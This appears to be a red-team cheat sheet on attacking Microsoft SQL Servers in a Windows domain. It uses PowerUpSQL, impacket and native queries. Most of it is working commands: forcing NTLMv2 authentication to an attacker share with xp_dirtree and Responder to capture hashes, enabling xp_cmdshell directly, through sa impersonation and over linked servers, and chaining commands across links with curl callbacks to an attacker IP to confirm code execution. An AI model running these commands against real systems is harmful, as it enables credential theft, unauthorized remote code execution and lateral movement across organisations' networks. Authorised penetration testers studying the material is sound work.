## MSSQL Server Abuse

SQL Servers within a domain offer a fresh attack surface. Often they are misconfigured to provide overly permissive configurations to users, store sensitive data, and even link to servers in other domains which can lead to lateral movement opportunities. 

We can use PowerUpSQL to perform lots of the enumeration of SQL servers for us.

 https://github.com/NetSPI/PowerUpSQL 

### PowerUpSQL Basics

Using PowerupSQL we can discover MSSQL servers and test our connections:

```powershell
# Discover Servers
Get-SQLInstanceDomain
Get-SQLInstanceBroadcast
Get-SQLInstanceScanUDP

# Test connection to server
Get-SQLConnectionTest -Instance "sql.MATRIX.LOCAL,1433"

# Get information about the given instance
Get-SQLServerInfo -Instance "sql.MATRIX.LOCAL,1433"

# Automate the discovery and info of every server
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo

# Run a command to check the version on the target machine
Get-SQLQuery -Instance "sql.MATRIX.LOCAL,1433" -Query "select @@version"

# Get Server Privileges for the current user
Get-SQLServerPriv
```

### PowerUpSQL Attacks

There are multiple attack vectors we can use pre-built into PowerUpSQL. For instance, we can force a connection back to an server we control to capture the users NTLMv2 hash to either crack with hashcat (`-m 5600`) or relay.

First we'll set up Responder or Inveigh (Linux, Windows respectively).

✨✨ https://github.com/Kevin-Robertson/InveighZero ✨✨

✨✨ https://github.com/SpiderLabs/Responder ✨✨

```powershell
sudo responder -I <interface>

C:\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N
```

Then we'll try to trigger a connection to our share.

```powershell
Get-SQLQuery -Instance "sql.MATRIX.LOCAL,1433" -Query "EXEC xp_dirtree '\\10.10.10.10\share', 1, 1"
```

Furthermore, we can try to execute commands on the target. This is possible if `xp_cmdshell` is enabled. However, PowerUpSQL will attempt enable and then disable it automatically to run the command if it's disabled.

```powershell
Invoke-SQLOSCmd -Instance "sql.MATRIX.LOCAL,1433" -Command "curl 10.10.10.10" -RawResults
```

### Manually Exploiting MSSQL

We can manually enumerate servers from the target using native commands:

```powershell
setspn -T MATRIX -Q MSSQLSvc/* 
setspn -T MATRIX.LOCAL -Q MSSQLSvc/* 
```

So if we don't want to use PowerUpSQL, we can try things manually instead. We can connect to the target database with any MSSQL connection software, such as `Sqsh` or impacket's `mssqlclient.py`. It may be necessary to portforward from the target for this to be possible.

```bash
# Connecting using mssqlclient
impacket-mssqlclient -windows-auth MATRIX/Neo:'strongpassword'@SQL.MATRIX.LOCAL
```

We'll test if `xp_cmdshell` is enabled. 

```sql
EXEC xp_cmdshell 'whoami';
```

If it fails, we can either enable it with `sa` privileges or if RPC OUT is enabled (Disabled by default).

```sql
--check if it is disabled == 0 value == disabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

--enable it 
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;

--check if it is enabled == 1 value == enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

--run your command again
EXEC xp_cmdshell 'whoami';

--try to force NTLMv2 auth
EXEC xp_dirtree '\\10.10.10.10\share';
```


### Advanced MSSQL Abuse - Impersonation

Sometimes it's possible to impersonate users and run commands in the context of their account. Confirm this with the following query:

```powershell
# Find any users we can impersonate
Get-SQLQuery -Verbose -Instance SQLSERVER -Query "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';"
```

If we find we can execute as another user, do it by doing the following (should return the user we impersonate):

```powershell
Get-SQLQuery -Verbose -Instance CYWEBDW -Query "EXECUTE AS LOGIN = 'sa';SELECT SYSTEM_USER;"
```

Using this, you can turn on `xp_cmdshell`!

```powershell
Get-SQLQuery -Verbose -Instance SQLSERVER -Query "EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE;"
Get-SQLQuery -Verbose -Instance SQLSERVER -Query "EXECUTE AS LOGIN = 'sa'; EXECUTE('sp_configure ''xp_cmdshell'', 1'); RECONFIGURE;"
```

### Advanced MSSQL Abuse - Links

Linked servers allow access to data from various different sources - Including other MSSQL servers. This can occur across domains, forests, and even clouds.

We can identify linked servers using the following query:

```sql
select * from master..sysservers;
```

Once a linked server is identified, you can try to execute commands on the target.

```sql
SELECT * FROM OPENQUERY("sql-backup.matrix-backup.local", 'select @@version');
```

This means we can check if `xp_cmdshell` is open on the linked server:

```sql
-- 1 is enabled, 0 is disabled
SELECT * FROM OPENQUERY("sql-backup.matrix-backup.local", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
```

If it's not activated, it unfortunately cannot be activated over a link using OpenQuery. Instead, we have to use the AT keyword. These queries can be run from PowerUpSQL or from the MSSQL client you're using, obviously just adjust it so you're sending either the full command or just the query.

```sql
-- A couple ways to turn it on using different aspects of powerupsql
powerpick Get-SQLServerLinkCrawl -instance "sql.MATRIX.LOCAL" -verbose -Query 'EXECUTE(''sp_configure ''''show advanced options'''',1;reconfigure;'') AT "sql-backup.matrix-backup.local"'

powerpick Get-SQLServerLinkCrawl -instance "sql.MATRIX.LOCAL" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "sql-backup.matrix-backup.local"'

powerpick Get-SQLQuery -Verbose -Instance "sql.MATRIX.LOCAL" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT "sql-backup.matrix-backup.local"'

powerpick Get-SQLQuery -Verbose -Instance "sql.MATRIX.LOCAL" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT "sql-backup.matrix-backup.local"'
```

PowerUpSQL provides a pre-built module to query all remote servers and check for existence of sysadmin privileges within that server:

```powershell
Get-SQLServerLinkCrawl
```

You can run commands through multiple chained links, too. Here we demonstrate in the first command going through one link, then through that link, to another server. 

🚩 Note: You obviously need to ensure that your servers are routable as you will not get output from commands over multiple servers. I recommend pinging or curling yourself to check RCE. 🚩

```powershell
Get-SQLQuery -Instance "sql.MATRIX.LOCAL,1433" -Query "SELECT * FROM OPENQUERY(""sql-backup.matrix-backup.local"", 'select @@servername; exec xp_cmdshell ''curl 10.10.10.10/rce''')"

Get-SQLQuery -Instance "sql.MATRIX.LOCAL,1433" -Query "SELECT * FROM OPENQUERY(""sql-backup.matrix-backup.local"", 'select * from openquery(""sql-master.zion.local"", ''select @@servername; exec xp_cmdshell ''''curl 10.10.10.10/rce'''''')')"
```